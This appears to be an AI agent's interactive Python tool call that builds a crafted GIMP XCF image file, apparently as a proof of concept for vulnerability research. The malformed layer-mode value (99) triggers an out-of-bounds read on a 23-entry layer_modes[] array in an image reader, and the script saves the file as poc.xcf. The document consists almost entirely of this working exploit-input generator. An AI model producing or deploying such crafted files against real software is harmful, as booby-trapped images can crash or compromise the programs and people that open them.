Running Python code interactively: import struct

# Build a minimal XCF file that triggers OOB read on layer_modes[]
# XCF format is big-endian

# Header: "gimp xcf v001\0" = 14 bytes
header = b"gimp xcf v001\x00"

# Image: width=1, height=1, type=0 (RGB)
img_width = struct.pack(">I", 1)
img_height = struct.pack(">I", 1)
img_type = struct.pack(">i", 0)  # RGB

# Image properties:
# PROP_COMPRESSION: type=17, size=4, data=0 (COMPRESS_NONE)
prop_compression = struct.pack(">II", 17, 4) + struct.pack(">I", 0)
# PROP_END: type=0, size=0
prop_end = struct.pack(">II", 0, 0)

image_properties = prop_compression + prop_end

# Calculate where layer data will start
# header(14) + width(4) + height(4) + type(4) + image_properties + layer_offset(4) + terminator(4)
header_section = header + img_width + img_height + img_type + image_properties
layer_offset_pos = len(header_section)
# layer offset (4 bytes) + terminator (4 bytes) = 8 bytes
layer_data_offset = layer_offset_pos + 8

# Layer offset list: one offset pointing to layer data, then 0 terminator
layer_offsets = struct.pack(">i", layer_data_offset) + struct.pack(">i", 0)

# Layer data:
# width(4) + height(4) + type(4) + name (QDataStream format: uint32 len including null + chars)
layer_width = struct.pack(">I", 1)
layer_height = struct.pack(">I", 1)
layer_type = struct.pack(">i", 0)  # RGB_GIMAGE
# QDataStream reads char* as: uint32 length (including null) then the bytes
# For a name "X\0": length=2
layer_name = struct.pack(">I", 2) + b"X\x00"

# Layer properties:
# PROP_OPACITY: type=6, size=4, data=255
prop_opacity = struct.pack(">II", 6, 4) + struct.pack(">I", 255)
# PROP_VISIBLE: type=8, size=4, data=1
prop_visible = struct.pack(">II", 8, 4) + struct.pack(">I", 1)
# PROP_MODE: type=7, size=4, data=99 (out of bounds - array has 23 entries)
prop_mode = struct.pack(">II", 7, 4) + struct.pack(">I", 99)
# PROP_END
layer_prop_end = struct.pack(">II", 0, 0)

layer_properties = prop_opacity + prop_visible + prop_mode + layer_prop_end

# After layer properties, need hierarchy_offset and mask_offset
# hierarchy will come right after
layer_header = layer_width + layer_height + layer_type + layer_name + layer_properties

hierarchy_offset_pos = layer_data_offset + len(layer_header)
# hierarchy_offset(4) + mask_offset(4)
hierarchy_data_offset = hierarchy_offset_pos + 8
mask_offset = 0  # no mask

layer_offsets_section = struct.pack(">I", hierarchy_data_offset) + struct.pack(">I", mask_offset)

# Hierarchy: width(4) + height(4) + bpp(4) + level_offset(4) + terminator(4)
# Then level data
hierarchy_header_offset = hierarchy_data_offset
level_data_offset = hierarchy_data_offset + 20  # 5 * 4 bytes

hierarchy_data = struct.pack(">I", 1)  # width
hierarchy_data += struct.pack(">I", 1)  # height  
hierarchy_data += struct.pack(">I", 3)  # bpp (3 for RGB)
hierarchy_data += struct.pack(">I", level_data_offset)  # first level offset
hierarchy_data += struct.pack(">I", 0)  # terminator

# Level: width(4) + height(4) + tile_offset(4) + terminator(4)
tile_data_offset = level_data_offset + 16  # 4 * 4 bytes

level_data = struct.pack(">I", 1)  # width
level_data += struct.pack(">I", 1)  # height
level_data += struct.pack(">I", tile_data_offset)  # first tile offset
level_data += struct.pack(">I", 0)  # terminator

# Tile data: For COMPRESS_NONE, it's just raw pixel data
# 1x1 RGB pixel = 3 bytes
tile_data = b"\xff\x00\x00"  # red pixel

# Assemble the full file
xcf_data = header_section + layer_offsets + layer_header + layer_offsets_section + hierarchy_data + level_data + tile_data

with open("/workspace/poc.xcf", "wb") as f:
    f.write(xcf_data)

print(f"File size: {len(xcf_data)} bytes")
print(f"Layer data offset: {layer_data_offset}")
print(f"Hierarchy data offset: {hierarchy_data_offset}")
print(f"Level data offset: {level_data_offset}")
print(f"Tile data offset: {tile_data_offset}")
